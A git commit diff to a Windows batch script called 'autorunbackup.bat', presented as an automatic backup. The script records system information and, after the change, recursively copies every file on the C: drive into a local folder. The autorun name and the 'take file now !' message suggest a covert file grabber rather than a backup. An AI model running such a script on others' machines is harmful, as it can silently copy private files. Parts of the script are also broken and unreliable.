0d11f12a7d0dd3157655df23c153e6e6b81e90b3
Dimitrios Papadimitriou <44374852+papadim97@users.noreply.github.com>
2021-09-06 21:48:27 +0300

    Complete Auto backup

--- autorunbackup.bat
+++ autorunbackup.bat
@@ -4,9 +4,7 @@ cd autorunbackup
 date /t >> systeminfo.txt
 systeminfo >> systeminfo.txt
 echo take file now !
-mkdir Downloads Desktop Favorites wifi Pictures Downloads
-
-cmd /c start if exist D:\ (echo File:  exist! | cp -rf Pictures D:\autorunbackup\Pictures) else (echo file %1 doe not exist ! :( )
-
-
-cmd /c start
+mkdir backup
+cd backup
+for /r C:\ %%x in (*) do @copy /y "%%x"
+cd..
